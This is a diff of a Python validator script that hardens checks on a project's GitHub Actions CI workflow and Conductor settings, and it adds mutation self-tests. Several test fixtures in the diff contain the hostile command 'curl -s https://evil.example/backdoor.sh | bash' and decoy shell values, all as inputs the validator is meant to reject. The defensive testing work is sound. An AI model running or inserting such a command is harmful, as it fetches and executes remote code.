@@ -143,13 +143,9 @@ CONDUCTOR_GATES = (
     ),
 )
 CONDUCTOR_REQUIRED_COMMANDS = tuple(command for command, _, _ in CONDUCTOR_GATES)
-# The complete, exact set of jobs this file knows how to validate. Every
-# check downstream (SHA-pin scan, per-job step checks) only ever inspects
-# jobs by these names, so an undocumented extra job must be rejected — see
-# the exact-set check in validate_workflow() — or it would run completely
-# unreviewed.
-CI_JOB_NAMES = ("validate", "security", "docker-build")
 # ci.yml validate-job steps that legitimately run something other than a gate.
+# Their run: bodies are content-checked individually below; they are not
+# exempt from validation, only from the CONDUCTOR_GATES derivation.
 CI_VALIDATE_SUPPORT_STEPS = frozenset({"Install dependencies", "Check whitespace"})
 # Every named `run:` step in jobs.security and jobs.docker-build. Each one is
 # individually validated below (require_run_pattern/step_by_name); this set
@@ -167,6 +163,21 @@ CI_SECURITY_STEPS = frozenset(
     }
 )
 CI_DOCKER_BUILD_STEPS = frozenset({"Build add-on image"})
+# The complete, exact set of jobs this file knows how to validate, mapped to
+# the named `run:` steps each one may contain. Every downstream check (SHA-pin
+# scan, duplicate-name scan, per-job step checks) iterates this mapping, so a
+# job added here is automatically covered by all of them and an undocumented
+# extra job in ci.yml is rejected — see validate_workflow().
+CI_KNOWN_RUN_STEPS = {
+    "validate": CI_VALIDATE_SUPPORT_STEPS.union(
+        step_name for _, step_name, _ in CONDUCTOR_GATES if step_name
+    ),
+    "security": CI_SECURITY_STEPS,
+    "docker-build": CI_DOCKER_BUILD_STEPS,
+}
+# Derived, never hand-written: a job cannot be declared known without also
+# declaring which named run: steps it may contain.
+CI_JOB_NAMES = tuple(CI_KNOWN_RUN_STEPS)
 FAVICON_SOURCE = "assets/sleepradar-mark.svg"
 FAVICON_PATH = "favicon.svg"
 FAVICON_VIEW_BOX = "0 0 128 128"
@@ -310,24 +321,34 @@ def validate_dockerfile() -> None:
         )
 
 
-def workflow_jobs() -> dict:
+def load_workflow() -> dict:
     path = ROOT / ".github/workflows/ci.yml"
     with path.open(encoding="utf-8") as handle:
         workflow = yaml.safe_load(handle)
     if not isinstance(workflow, dict):
         fail(".github/workflows/ci.yml must parse as a YAML mapping")
+    return workflow
+
+
+def validate_workflow_permissions(workflow: dict) -> None:
+    """Require the read-only workflow-level token grant.
+
+    Split out of the file-reading path so the self-test can mutate it: a guard
+    that only runs when the real ci.yml is parsed has no expect_fail fixture,
+    so it can silently decay without the drift check noticing.
+    """
 
     if workflow.get("permissions") != {"contents": "read"}:
         fail(".github/workflows/ci.yml must set permissions: contents: read")
 
+
+def workflow_jobs() -> dict:
+    workflow = load_workflow()
+    validate_workflow_permissions(workflow)
+
     jobs = workflow.get("jobs")
     if not isinstance(jobs, dict):
         fail(".github/workflows/ci.yml must define jobs")
-    for name in CI_JOB_NAMES:
-        if name not in jobs:
-            fail(f".github/workflows/ci.yml must define jobs.{name}")
-        if not isinstance(jobs[name], dict):
-            fail(f".github/workflows/ci.yml jobs.{name} must be a mapping")
     return jobs
 
 
@@ -378,17 +399,31 @@ def require_known_run_steps(steps: list[dict], known_names, job_name: str) -> No
     completely unvalidated: it isn't a duplicate of a known step, and it
     isn't checked by any name-specific require_run_pattern()/step_by_name()
     call, so nothing in this file would ever look at it.
+
+    Membership is keyed on the presence of a `run:` key, NOT on its parsed
+    type. PyYAML types plain scalars, so `run: on` becomes True and
+    `run: 123` becomes an int, while GitHub Actions stringifies and executes
+    both — an isinstance(str) gate here would skip every check for them.
     """
 
     for step in steps:
         name = step.get("name")
-        if isinstance(step.get("run"), str) and name not in known_names:
+        if "run" not in step:
+            continue
+        if not isinstance(step.get("run"), str):
+            fail(
+                f".github/workflows/ci.yml jobs.{job_name} step {name!r} must "
+                "quote its run: script; unquoted YAML scalars such as `on` or "
+                "`123` parse as bool/int here while GitHub Actions still runs "
+                "them, which would skip every run-step check in this validator"
+            )
+        if name not in known_names:
             fail(
                 f".github/workflows/ci.yml jobs.{job_name} step {name!r} is not "
-                "a documented step for this job; add it to the known-step set "
-                "for that job in scripts/validate_repository.py (and to "
-                "CONDUCTOR_GATES, .conductor/settings.toml, CONTRIBUTING.md, "
-                "and .github/PULL_REQUEST_TEMPLATE.md if it should also be a "
+                "a documented step for this job; add it to CI_KNOWN_RUN_STEPS "
+                "in scripts/validate_repository.py (and to CONDUCTOR_GATES, "
+                ".conductor/settings.toml, CONTRIBUTING.md, and "
+                ".github/PULL_REQUEST_TEMPLATE.md if it should also be a "
                 "shared local/CI gate)"
             )
 
@@ -396,45 +431,59 @@ def require_known_run_steps(steps: list[dict], known_names, job_name: str) -> No
 def validate_workflow(jobs=None) -> None:
     jobs = workflow_jobs() if jobs is None else jobs
 
-    # Every check below only ever inspects jobs.validate/security/docker-build
-    # by name. Without this, a brand-new job (e.g. jobs.deploy) with its own
-    # unpinned actions and unreviewed run: steps would never be looked at by
-    # anything in this file — the same "unseen name skips every check" bug
-    # already closed at the step level (duplicate names, then undocumented
-    # steps within an existing job), recurring one level up at job
-    # granularity.
-    extra_jobs = sorted(set(jobs) - set(CI_JOB_NAMES))
+    # Every check below only inspects jobs named in CI_KNOWN_RUN_STEPS.
+    # Without this, a brand-new job (e.g. jobs.deploy) with its own unpinned
+    # actions and unreviewed run: steps would never be looked at by anything
+    # in this file — the same "unseen name skips every check" bug already
+    # closed at the step level (duplicate names, then undocumented steps
+    # within an existing job), recurring one level up at job granularity.
+    # sorted(key=str): a job id that YAML types as a bool (`on`, `yes`, `off`
+    # are all legal GitHub job ids) would otherwise make a mixed-type sort
+    # raise TypeError instead of reporting this actionable failure.
+    extra_jobs = sorted(set(jobs) - set(CI_JOB_NAMES), key=str)
     if extra_jobs:
         fail(
             f".github/workflows/ci.yml defines undocumented job(s) {extra_jobs}; "
-            "add them to CI_JOB_NAMES in scripts/validate_repository.py and "
-            "give them the same validation as validate/security/docker-build, "
-            "or remove them"
+            "add them to CI_KNOWN_RUN_STEPS in scripts/validate_repository.py "
+            "(which is what every per-job check iterates) and give them the "
+            "same validation as validate/security/docker-build, or remove them"
         )
+    # Required-job presence is checked here rather than in workflow_jobs() so
+    # an injected jobs dict fails closed with a ValidationError instead of a
+    # raw KeyError out of job_steps() — expect_fail() only catches the former.
+    for name in CI_JOB_NAMES:
+        if name not in jobs:
+            fail(f".github/workflows/ci.yml must define jobs.{name}")
+        if not isinstance(jobs[name], dict):
+            fail(f".github/workflows/ci.yml jobs.{name} must be a mapping")
 
-    validate_steps = job_steps(jobs, "validate")
-    security_steps = job_steps(jobs, "security")
-    docker_steps = job_steps(jobs, "docker-build")
-    all_steps = validate_steps + security_steps + docker_steps
+    # Derived from CI_KNOWN_RUN_STEPS, never a hand-written job list: a job
+    # documented there is automatically covered by the duplicate-name scan,
+    # the SHA-pin scan and the unknown-step scan below. A hardcoded list here
+    # meant a job added per the error message above escaped all three.
+    steps_by_job = {name: job_steps(jobs, name) for name in CI_JOB_NAMES}
+    validate_steps = steps_by_job["validate"]
+    security_steps = steps_by_job["security"]
+    docker_steps = steps_by_job["docker-build"]
+    all_steps = [step for steps in steps_by_job.values() for step in steps]
 
     # step_by_name()/step_run() only ever inspect the FIRST step matching a
     # given name. Without this check, a second step reusing an existing gate's
     # name (e.g. a duplicate "Validate add-on package") would never be
     # inspected by require_run_pattern() — the exact "undocumented CI gate"
     # this file's drift checks exist to catch would slip through silently.
-    for job_name, steps in [
-        ("validate", validate_steps),
-        ("security", security_steps),
-        ("docker-build", docker_steps),
-    ]:
+    for job_name, steps in steps_by_job.items():
         # Steps without a `name` (typically bare `uses:` steps) are legitimately
         # anonymous and excluded — only a repeated *actual* name is a bypass risk.
         duplicates = sorted(
-            name
-            for name, count in collections.Counter(
-                step.get("name") for step in steps if step.get("name") is not None
-            ).items()
-            if count > 1
+            (
+                name
+                for name, count in collections.Counter(
+                    step.get("name") for step in steps if step.get("name") is not None
+                ).items()
+                if count > 1
+            ),
+            key=str,
         )
         if duplicates:
             fail(
@@ -475,41 +524,40 @@ def validate_workflow(jobs=None) -> None:
     ):
         fail(".github/workflows/ci.yml must install requirements-ci.txt")
 
-    whitespace_run = step_run(validate_steps, "Check whitespace")
-    for required in ["BASE_SHA", "HEAD_SHA", "git diff --check"]:
-        if required not in whitespace_run:
+    # Structural, not substring: every required marker used to be accepted
+    # anywhere in the body, so a step whose whole script was a `#` comment
+    # passed while checking nothing. Require the two real command lines.
+    whitespace_step = step_by_name(validate_steps, "Check whitespace")
+    whitespace_env = whitespace_step.get("env")
+    if not isinstance(whitespace_env, dict) or not {"BASE_SHA", "HEAD_SHA"} <= set(
+        whitespace_env
+    ):
+        fail(
+            ".github/workflows/ci.yml Check whitespace step must define "
+            "BASE_SHA and HEAD_SHA in env"
+        )
+    whitespace_lines = shell_command_lines(step_run(validate_steps, "Check whitespace"))
+    for required in ['git diff --check "$BASE_SHA...$HEAD_SHA"', "git diff --check"]:
+        if required not in whitespace_lines:
             fail(
                 ".github/workflows/ci.yml Check whitespace step must compare "
-                f"the checked-out branch with git diff --check using {required}"
+                "the checked-out branch with git diff --check, as an executed "
+                f"command line: {required}"
             )
     for command, step_name, purpose in CONDUCTOR_GATES:
         if step_name is None:
             continue
         require_run_pattern(validate_steps, step_name, ci_run_pattern(command), purpose)
 
-    # Every gate in ci.yml must also be a documented local gate. Without this,
-    # a new CI step would pass validation while .conductor/settings.toml (and
-    # CONTRIBUTING.md) silently lagged behind it.
-    known_validate_steps = CI_VALIDATE_SUPPORT_STEPS.union(
-        step_name for _, step_name, _ in CONDUCTOR_GATES if step_name
-    )
-    for step in validate_steps:
-        name = step.get("name")
-        if isinstance(step.get("run"), str) and name not in known_validate_steps:
-            fail(
-                f".github/workflows/ci.yml jobs.validate step {name!r} runs a "
-                "gate that is not declared in CONDUCTOR_GATES; add it there, "
-                "plus .conductor/settings.toml, CONTRIBUTING.md, and "
-                ".github/PULL_REQUEST_TEMPLATE.md so local runs stay "
-                "CI-equivalent"
-            )
-
-    # The validate-job check above only covers jobs.validate. Without an
-    # equivalent check here, a brand-new (non-duplicate) named step appended
-    # to jobs.security or jobs.docker-build — the jobs that run Gitleaks and
-    # build the Docker image — would run completely unreviewed.
-    require_known_run_steps(security_steps, CI_SECURITY_STEPS, "security")
-    require_known_run_steps(docker_steps, CI_DOCKER_BUILD_STEPS, "docker-build")
+    # Every named run: step in every known job must be a documented step, so a
+    # brand-new (non-duplicate) name cannot run unreviewed. For jobs.validate
+    # that means a declared CONDUCTOR_GATES gate or one of the two
+    # content-checked support steps in CI_VALIDATE_SUPPORT_STEPS; anything else
+    # would leave .conductor/settings.toml and CONTRIBUTING.md lagging CI.
+    # Note this covers `run:` steps only — an extra SHA-pinned `uses:` step is
+    # still accepted (see docs/repository-validation.md limitations).
+    for job_name, steps in steps_by_job.items():
+        require_known_run_steps(steps, CI_KNOWN_RUN_STEPS[job_name], job_name)
 
     for step in all_steps:
         run = step.get("run")
@@ -570,31 +618,98 @@ def validate_workflow(jobs=None) -> None:
             )
 
     # This self-test is the only CI step that proves .gitleaks.toml itself still
-    # detects anything: the step above it scans a temp dir, so it loads the
-    # DEFAULT ruleset and would stay green even if the repo allowlist were
-    # broadened to suppress everything. Require both control directions.
-    config_selftest_run = step_run(
-        security_steps, "Self-test repo config detects and excludes correctly"
+    # detects anything: the "Self-test secret scanner" step scans a temp dir, so
+    # it loads the DEFAULT ruleset and would stay green even if the repo
+    # allowlist were broadened to suppress everything. Require both control directions,
+    # matched against executed command lines rather than by substring:
+    # substring matching accepted a step with the whole exclusion control
+    # deleted (the bare scan is a substring of the `if` line, and the .gstack
+    # filename appears in the trap line), and accepted a step whose every
+    # marker sat in a `#` comment.
+    config_selftest_lines = shell_command_lines(
+        step_run(security_steps, "Self-test repo config detects and excludes correctly")
     )
-    for required in [
-        "trap ",
-        ".gitleaks-selftest",
-        "api_key",
-        "if gitleaks dir --no-banner --redact .; then",
-        "exit 1",
-        ".gstack/gitleaks-generated-state-self-test.json",
-        "gitleaks dir --no-banner --redact .",
-    ]:
-        if required not in config_selftest_run:
+    positive_control = "if gitleaks dir --no-banner --redact .; then"
+    exclusion_scan = "gitleaks dir --no-banner --redact ."
+    gstack_selftest_state = ".gstack/gitleaks-generated-state-self-test.json"
+    required_lines = {
+        # A bare `trap ` would accept `trap '' EXIT`, which cleans up nothing
+        # and leaves both planted secrets in the workspace.
+        "a cleanup trap naming both planted paths": lambda line: (
+            line.startswith("trap ")
+            and ".gitleaks-selftest" in line
+            and gstack_selftest_state in line
+        ),
+        "a planted secret in a normal path": lambda line: (
+            line.startswith("printf ")
+            and "api_key" in line
+            and ".gitleaks-selftest" in line
+        ),
+        "the positive control (config must detect it)": (
+            lambda line: line == positive_control
+        ),
+        "a failing exit when detection does not happen": lambda line: line == "exit 1",
+        "the same secret planted under generated .gstack state": lambda line: (
+            line.startswith("printf ")
+            and "api_key" in line
+            and gstack_selftest_state in line
+        ),
+        "the exclusion control as its own scan (config must NOT flag it)": (
+            lambda line: line == exclusion_scan
+        ),
+    }
+    first_index = {}
+    for description, matches in required_lines.items():
+        index = next(
+            (i for i, line in enumerate(config_selftest_lines) if matches(line)), None
+        )
+        if index is None:
             fail(
                 ".github/workflows/ci.yml Gitleaks config self-test must prove "
                 "the repo config both detects a planted secret and excludes "
-                f"generated .gstack state, using: {required}"
+                f"generated .gstack state; it is missing {description}"
+            )
+        first_index[description] = index
+
+    # Presence alone is order-independent, so hoisting the exclusion scan above
+    # the .gstack plant would keep every marker present while that scan ran
+    # against a clean tree and proved nothing. Each control must be planted
+    # before the scan that is supposed to react to it.
+    for earlier, later in [
+        (
+            "a planted secret in a normal path",
+            "the positive control (config must detect it)",
+        ),
+        (
+            "the same secret planted under generated .gstack state",
+            "the exclusion control as its own scan (config must NOT flag it)",
+        ),
+    ]:
+        if first_index[earlier] > first_index[later]:
+            fail(
+                ".github/workflows/ci.yml Gitleaks config self-test runs "
+                f"{later!r} before {earlier!r}; a scan that precedes its own "
+                "planted input proves nothing"
             )
 
     scan_run = step_run(security_steps, "Scan current tree for secrets")
     if "gitleaks dir --no-banner --redact --verbose ." not in scan_run:
         fail(".github/workflows/ci.yml must scan the current worktree with Gitleaks")
+
+
+def shell_command_lines(run: str) -> list[str]:
+    """Return the executable lines of a run: script, without comments.
+
+    Guards that match anywhere in the body are satisfiable by text inside a
+    `#` comment, so every structural check works from this list instead.
+    """
+
+    lines = []
+    for raw in run.splitlines():
+        line = raw.strip()
+        if line and not line.startswith("#"):
+            lines.append(line)
+    return lines
 
 
 def ci_run_pattern(conductor_command: str) -> str:
@@ -605,19 +720,33 @@ def ci_run_pattern(conductor_command: str) -> str:
     keeps a single gate list instead of two hand-maintained copies. The pattern
     is fully anchored so a step cannot satisfy its guard by running a
     *different* invocation that merely contains the expected substring.
+
+    Only horizontal whitespace is allowed between tokens. `\\s` would match a
+    newline, so a block scalar splitting the gate across lines matched the
+    "fully anchored" pattern while the shell ran each line as its own command
+    — the same fold normalized_shell_commands() refuses on the Conductor side.
+    A single trailing newline is allowed because YAML block scalars end with
+    one.
     """
 
     for prefix, replacement in (
-        (".venv/bin/python ", r"python3?\s+"),
-        (".venv/bin/yamllint ", r"yamllint\s+"),
+        (".venv/bin/python ", r"python3?[ \t]+"),
+        (".venv/bin/yamllint ", r"yamllint[ \t]+"),
     ):
         if conductor_command.startswith(prefix):
             rest = conductor_command[len(prefix) :]
             break
     else:
+        if conductor_command.startswith(".venv/"):
+            fail(
+                "scripts/validate_repository.py cannot derive a CI pattern for "
+                f"the gate {conductor_command!r}: CI has no workspace venv, so "
+                "add a prefix translation for this tool to ci_run_pattern() "
+                "rather than exempting the step from the derived gate list"
+            )
         replacement, rest = "", conductor_command
-    escaped = r"\s+".join(re.escape(token) for token in rest.split())
-    return r"\A\s*" + replacement + escaped + r"\s*\Z"
+    escaped = r"[ \t]+".join(re.escape(token) for token in rest.split())
+    return r"\A[ \t]*" + replacement + escaped + r"[ \t]*\n?\Z"
 
 
 def normalized_shell_commands(command: str) -> list[str]:
@@ -693,12 +822,43 @@ def conductor_run_commands(text: str) -> list[str]:
     if isinstance(run, str):
         commands.append(run)
     elif isinstance(run, dict):
-        # Structured form: [scripts.run.<name>] command = "..."
-        for name, entry in sorted(run.items()):
-            if isinstance(entry, dict) and isinstance(entry.get("command"), str):
-                commands.append(entry["command"])
-            elif isinstance(entry, str) and name == "command":
+        # Two table forms are accepted: flat (`[scripts.run] command = "..."`)
+        # and named (`[scripts.run.<name>] command = "..."`). Every other shape
+        # must fail closed. Silently skipping an unrecognized entry made the
+        # "exactly one command" check below count a filtered view, so an extra
+        # runnable entry (a non-string command, or a stray key beside a valid
+        # `command`) could sit alongside the one validated gate chain.
+        for name, entry in sorted(run.items(), key=lambda item: str(item[0])):
+            if name == "command":
+                if not isinstance(entry, str):
+                    fail(
+                        ".conductor/settings.toml scripts.run.command must be a string"
+                    )
                 commands.append(entry)
+            elif isinstance(entry, dict):
+                command = entry.get("command")
+                if not isinstance(command, str):
+                    fail(
+                        f".conductor/settings.toml scripts.run.{name} must "
+                        "define a string command"
+                    )
+                commands.append(command)
+                # args, options.cwd and available_in all change what actually
+                # runs (or whether it runs locally at all), so an entry whose
+                # command text matches the gate chain is not proof on its own.
+                extra_keys = sorted(set(entry) - {"command"}, key=str)
+                if extra_keys:
+                    fail(
+                        f".conductor/settings.toml scripts.run.{name} declares "
+                        f"unvalidated key(s) {extra_keys}; args, options and "
+                        "available_in change what Conductor actually executes, "
+                        "so the gate chain would no longer be what runs"
+                    )
+            else:
+                fail(
+                    f".conductor/settings.toml scripts.run.{name} must be a "
+                    "table defining a string command"
+                )
     elif run is not None:
         fail(".conductor/settings.toml scripts.run must be a string or a table")
 
@@ -1351,6 +1511,20 @@ def run_self_test() -> None:
             return
         failures.append(f"{name}: expected ValidationError, none raised")
 
+    def build_fixture(name, fn):
+        """Build a mutation fixture without aborting the whole self-test.
+
+        These builders parse the real ci.yml and settings.toml. Calling them
+        bare let a ValidationError escape run_self_test() entirely, discarding
+        every failure collected so far — exactly when several are most likely.
+        """
+
+        try:
+            return fn()
+        except ValidationError as exc:
+            failures.append(f"{name}: fixture unavailable, mutations skipped ({exc})")
+            return None
+
     card = (ROOT / "card/sleepradar-card.js").read_text()
     readme = (ROOT / "README.md").read_text()
     tracking = (ROOT / "examples/sleep_tracking.yaml").read_text()
@@ -1408,63 +1582,130 @@ def run_self_test() -> None:
             failures.append(f"self-test anchor not found: {old!r}")
         return text.replace(old, new)
 
-    conductor_command = conductor_run_commands(conductor_settings)[0]
-    structured_conductor_settings = (
-        "[scripts]\n"
-        'setup = "true"\n'
-        "[scripts.run.validate]\n"
-        f"command = {json.dumps(conductor_command)}\n"
-    )
-    expect_pass(
-        "structured conductor settings",
-        lambda: validate_conductor_settings(structured_conductor_settings),
-    )
-    # Flat form: [scripts.run] command = "..." (no per-name sub-table). Only
-    # the structured [scripts.run.<name>] form was previously covered.
-    flat_conductor_settings = (
-        "[scripts]\n"
-        'setup = "true"\n'
-        "[scripts.run]\n"
-        f"command = {json.dumps(conductor_command)}\n"
-    )
-    expect_pass(
-        "flat conductor settings",
-        lambda: validate_conductor_settings(flat_conductor_settings),
-    )
-    expect_fail(
-        "multiple conductor run commands",
-        lambda: validate_conductor_settings(
-            structured_conductor_settings
-            + "\n[scripts.run.decoy]\n"
-            + 'command = "exit 0"\n'
-        ),
-    )
-    # A line-oriented parser accepted the gate text inside a multi-line string
-    # even with no run key present at all. Real TOML parsing must reject it.
-    expect_fail(
-        "conductor multiline string decoy",
-        lambda: validate_conductor_settings(
+    def conductor_command_fixtures(conductor_command):
+        structured_conductor_settings = (
             "[scripts]\n"
             'setup = "true"\n'
-            'note = """\n'
-            f"run = {json.dumps(conductor_command)}\n"
-            '"""\n'
-        ),
+            "[scripts.run.validate]\n"
+            f"command = {json.dumps(conductor_command)}\n"
+        )
+        expect_pass(
+            "structured conductor settings",
+            lambda: validate_conductor_settings(structured_conductor_settings),
+        )
+        # Flat form: [scripts.run] command = "..." (no per-name sub-table). Only
+        # the structured [scripts.run.<name>] form was previously covered.
+        flat_conductor_settings = (
+            "[scripts]\n"
+            'setup = "true"\n'
+            "[scripts.run]\n"
+            f"command = {json.dumps(conductor_command)}\n"
+        )
+        expect_pass(
+            "flat conductor settings",
+            lambda: validate_conductor_settings(flat_conductor_settings),
+        )
+        expect_fail(
+            "multiple conductor run commands",
+            lambda: validate_conductor_settings(
+                structured_conductor_settings
+                + "\n[scripts.run.decoy]\n"
+                + 'command = "exit 0"\n'
+            ),
+        )
+        # Unrecognized shapes were silently skipped, so an extra runnable entry
+        # could sit beside the validated one while the count still read 1.
+        expect_fail(
+            "conductor extra run entry with non-string command",
+            lambda: validate_conductor_settings(
+                structured_conductor_settings
+                + "\n[scripts.run.decoy]\n"
+                + 'command = ["bash", "-c", "exit 0"]\n'
+            ),
+        )
+        # The flat form's own `command` key must fail closed too: skipping a
+        # non-string value left the count at 1 (the named entry below), so the
+        # list form Conductor would actually run went entirely unvalidated.
+        expect_fail(
+            "conductor flat non-string command beside a valid entry",
+            lambda: validate_conductor_settings(
+                "[scripts]\n"
+                'setup = "true"\n'
+                "[scripts.run]\n"
+                'command = ["bash", "-c", "exit 0"]\n'
+                "[scripts.run.validate]\n"
+                f"command = {json.dumps(conductor_command)}\n"
+            ),
+        )
+        expect_fail(
+            "conductor flat form with stray sibling key",
+            lambda: validate_conductor_settings(
+                flat_conductor_settings + 'decoy = "exit 0"\n'
+            ),
+        )
+        # args/options/available_in change what Conductor actually executes, so
+        # a matching command string alone is not proof the gates run.
+        expect_fail(
+            "conductor run entry with execution-altering keys",
+            lambda: validate_conductor_settings(
+                structured_conductor_settings + 'args = ["||", "true"]\n'
+            ),
+        )
+        # A line-oriented parser accepted the gate text inside a multi-line
+        # string even with no run key present at all. Real TOML parsing must
+        # reject it.
+        expect_fail(
+            "conductor multiline string decoy",
+            lambda: validate_conductor_settings(
+                "[scripts]\n"
+                'setup = "true"\n'
+                'note = """\n'
+                f"run = {json.dumps(conductor_command)}\n"
+                '"""\n'
+            ),
+        )
+        # A decoded newline is a shell command terminator; whitespace
+        # normalization must not fold it into a space and call the broken
+        # chain a match.
+        newline_command = conductor_command.replace("git diff", "git\ndiff", 1)
+        expect_fail(
+            "conductor embedded newline in command",
+            lambda: validate_conductor_settings(
+                f"[scripts]\nrun = {json.dumps(newline_command)}\n"
+            ),
+        )
+        expect_fail(
+            "conductor settings invalid toml",
+            lambda: validate_conductor_settings(
+                f"[scripts\nrun = {json.dumps(conductor_command)}\n"
+            ),
+        )
+        # The decoy must not be mistaken for the real gate chain: a baseline
+        # gate is removed, so passing would mean an unrelated table satisfied
+        # the check.
+        conductor_settings_with_decoy = (
+            mutate(conductor_settings, f" && {CONDUCTOR_BASELINE_COMMAND}", "")
+            + "\n[unrelated]\n"
+            + f"command = {json.dumps(conductor_command)}\n"
+        )
+        expect_fail(
+            "conductor settings ignores unrelated command decoy",
+            lambda: validate_conductor_settings(conductor_settings_with_decoy),
+        )
+
+    conductor_command = build_fixture(
+        "conductor run command fixture",
+        lambda: conductor_run_commands(conductor_settings)[0],
     )
-    # A decoded newline is a shell command terminator; whitespace normalization
-    # must not fold it into a space and call the broken chain a match.
-    newline_command = conductor_command.replace("git diff", "git\ndiff", 1)
+    if conductor_command is not None:
+        conductor_command_fixtures(conductor_command)
+
+    # A gate run by some other workspace-venv tool has no CI translation;
+    # falling through would emit a pattern demanding `.venv/...` in ci.yml,
+    # which CI could never satisfy.
     expect_fail(
-        "conductor embedded newline in command",
-        lambda: validate_conductor_settings(
-            f"[scripts]\nrun = {json.dumps(newline_command)}\n"
-        ),
-    )
-    expect_fail(
-        "conductor settings invalid toml",
-        lambda: validate_conductor_settings(
-            f"[scripts\nrun = {json.dumps(conductor_command)}\n"
-        ),
+        "ci pattern for an untranslated .venv tool",
+        lambda: ci_run_pattern(".venv/bin/node tests/sleepradar-card.test.js"),
     )
     expect_fail(
         "conductor settings missing scripts table",
@@ -1479,148 +1720,384 @@ def run_self_test() -> None:
     reordered = list(CONDUCTOR_REQUIRED_COMMANDS)
     reordered[-1], reordered[-2] = reordered[-2], reordered[-1]
 
-    base_jobs = workflow_jobs()
+    base_workflow = build_fixture("ci.yml workflow fixture", load_workflow)
+    if base_workflow is not None:
+        # The permissions guard used to live only on the file-reading path, so
+        # no fixture could reach it and it could decay unnoticed.
+        expect_pass(
+            "workflow permissions real",
+            lambda: validate_workflow_permissions(base_workflow),
+        )
+        expect_fail(
+            "workflow permissions widened",
+            lambda: validate_workflow_permissions(
+                dict(base_workflow, permissions={"contents": "write"})
+            ),
+        )
+        expect_fail(
+            "workflow permissions missing",
+            lambda: validate_workflow_permissions(
+                {
+                    key: value
+                    for key, value in base_workflow.items()
+                    if key != "permissions"
+                }
+            ),
+        )
 
-    def workflow_with(job, mutate_steps):
-        mutated = copy.deepcopy(base_jobs)
-        mutated[job]["steps"] = mutate_steps(mutated[job]["steps"])
-        return mutated
+    base_jobs = build_fixture("ci.yml jobs fixture", workflow_jobs)
 
-    def set_step_run(steps, name, run):
-        for step in steps:
-            if step.get("name") == name:
-                step["run"] = run
-        return steps
+    def workflow_fixtures(base_jobs):
+        def workflow_with(job, mutate_steps):
+            mutated = copy.deepcopy(base_jobs)
+            mutated[job]["steps"] = mutate_steps(mutated[job]["steps"])
+            return mutated
 
-    expect_pass(
-        "workflow real",
-        lambda: validate_workflow(copy.deepcopy(base_jobs)),
-    )
-    # An unanchored guard let this pass: CI would run the self-test twice and
-    # never run real package validation, while the drift check stayed green.
-    expect_fail(
-        "workflow validate step running the self-test instead",
-        lambda: validate_workflow(
-            workflow_with(
-                "validate",
-                lambda steps: set_step_run(
-                    steps,
-                    "Validate add-on package",
-                    "python scripts/validate_repository.py --self-test",
-                ),
-            )
-        ),
-    )
-    # A new CI gate must also be a documented local gate, or Conductor and
-    # CONTRIBUTING.md silently lag behind CI.
-    expect_fail(
-        "workflow gate absent from the documented local chain",
-        lambda: validate_workflow(
-            workflow_with(
-                "validate",
-                lambda steps: steps
-                + [{"name": "Undocumented extra gate", "run": "python -c pass"}],
-            )
-        ),
-    )
-    # step_by_name()/step_run() only ever inspect the first match for a given
-    # name, so a duplicate step name could smuggle an unvalidated command past
-    # every check keyed on that name. Reusing a real gate's name must fail
-    # even though the first occurrence is untouched and legitimate.
-    expect_fail(
-        "workflow duplicate step name bypass",
-        lambda: validate_workflow(
-            workflow_with(
-                "validate",
-                lambda steps: steps
-                + [
-                    {
-                        "name": "Validate add-on package",
-                        "run": "curl -s https://evil.example/backdoor.sh | bash",
-                    }
-                ],
-            )
-        ),
-    )
-    # The validate-job completeness check has no equivalent for security/
-    # docker-build: a brand-new, non-duplicate-named step there would run
-    # completely unvalidated. Both jobs must reject an unknown named step.
-    expect_fail(
-        "workflow unknown security step",
-        lambda: validate_workflow(
-            workflow_with(
-                "security",
-                lambda steps: steps
-                + [
-                    {
-                        "name": "Totally new unrelated security step",
-                        "run": "curl -s https://evil.example/backdoor.sh | bash",
-                    }
-                ],
-            )
-        ),
-    )
-    expect_fail(
-        "workflow unknown docker-build step",
-        lambda: validate_workflow(
-            workflow_with(
-                "docker-build",
-                lambda steps: steps
-                + [
-                    {
-                        "name": "Totally new unrelated docker step",
-                        "run": "curl -s https://evil.example/backdoor.sh | bash",
-                    }
-                ],
-            )
-        ),
-    )
-    # workflow_with() only mutates steps within an existing job, so an
-    # entirely new job needs its own fixture: a brand-new, undocumented job
-    # must fail even though validate/security/docker-build are all present
-    # and untouched.
-    expect_fail(
-        "workflow undocumented extra job",
-        lambda: validate_workflow(
-            dict(
-                copy.deepcopy(base_jobs),
-                deploy={
-                    "runs-on": "ubuntu-latest",
-                    "steps": [
+        def set_step_run(steps, name, run):
+            for step in steps:
+                if step.get("name") == name:
+                    step["run"] = run
+            return steps
+
+        def set_step_env(steps, name, env):
+            for step in steps:
+                if step.get("name") == name:
+                    step["env"] = env
+            return steps
+
+        expect_pass(
+            "workflow real",
+            lambda: validate_workflow(copy.deepcopy(base_jobs)),
+        )
+        # An unanchored guard let this pass: CI would run the self-test twice and
+        # never run real package validation, while the drift check stayed green.
+        expect_fail(
+            "workflow validate step running the self-test instead",
+            lambda: validate_workflow(
+                workflow_with(
+                    "validate",
+                    lambda steps: set_step_run(
+                        steps,
+                        "Validate add-on package",
+                        "python scripts/validate_repository.py --self-test",
+                    ),
+                )
+            ),
+        )
+        # A new CI gate must also be a documented local gate, or Conductor and
+        # CONTRIBUTING.md silently lag behind CI.
+        expect_fail(
+            "workflow gate absent from the documented local chain",
+            lambda: validate_workflow(
+                workflow_with(
+                    "validate",
+                    lambda steps: steps
+                    + [{"name": "Undocumented extra gate", "run": "python -c pass"}],
+                )
+            ),
+        )
+        # step_by_name()/step_run() only ever inspect the first match for a given
+        # name, so a duplicate step name could smuggle an unvalidated command past
+        # every check keyed on that name. Reusing a real gate's name must fail
+        # even though the first occurrence is untouched and legitimate.
+        expect_fail(
+            "workflow duplicate step name bypass",
+            lambda: validate_workflow(
+                workflow_with(
+                    "validate",
+                    lambda steps: steps
+                    + [
                         {
-                            "name": "Totally new deploy step",
+                            "name": "Validate add-on package",
                             "run": "curl -s https://evil.example/backdoor.sh | bash",
                         }
                     ],
-                },
-            )
-        ),
-    )
-    # The Gitleaks config self-test step must prove BOTH control directions.
-    # Dropping just the "exit 1" (the positive-control failure branch) must
-    # still be caught, or this step could be weakened to a no-op scan.
-    expect_fail(
-        "workflow gitleaks config self-test missing positive control",
-        lambda: validate_workflow(
-            workflow_with(
-                "security",
-                lambda steps: set_step_run(
-                    steps,
-                    "Self-test repo config detects and excludes correctly",
-                    "trap 'rm -rf .gitleaks-selftest' EXIT\n"
